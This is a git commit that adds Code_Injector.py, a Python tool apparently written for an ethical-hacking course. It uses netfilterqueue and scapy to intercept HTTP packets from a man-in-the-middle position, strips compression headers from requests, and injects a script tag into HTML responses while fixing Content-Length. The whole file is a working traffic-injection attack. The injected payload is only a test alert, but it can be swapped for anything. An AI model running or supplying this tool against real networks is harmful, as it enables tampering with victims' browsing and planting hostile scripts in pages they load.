aa775c7ef4f76102ce93845952744f0b2033adad
Akatanon <93026972+Shmerzen@users.noreply.github.com>
2022-01-25 16:26:16 -0500

    Create Code_Injector.py
    Injects Code into the Targets Web-browser.

---
+++ Code_Injector.py
@@ -0,0 +1,48 @@
+#!/usr/bin/env python3
+
+
+import netfilterqueue
+import scapy.all as scapy
+import re
+# os.system("echo 1 >/proc/sys/net/ipv4/ip_forward")
+
+
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.Raw):
+        load = scapy_packet[scapy.Raw].load
+        if scapy_packet[scapy.TCP].dport == 80:
+            print("[+] Request")
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", str(load))
+
+        elif scapy_packet[scapy.TCP].sport == 80:
+            print("[+] Response")
+            injection_code = "<script>alert('test');</script>"
+            load = str(load).replace("</body>", injection_code + "</body>")
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+            if content_length_search and "text/html;" in load:
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
+
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
+            packet.set_payload(bytes(new_packet))
+
+    packet.accept()
+
+
+try:
+    queue = netfilterqueue.NetfilterQueue()
+    queue.bind(0, process_packet)
+    queue.run()
+except KeyboardInterrupt:
+    print("\n\n[+] Detected 'ctrl + c' ... Quitting ...!!!")
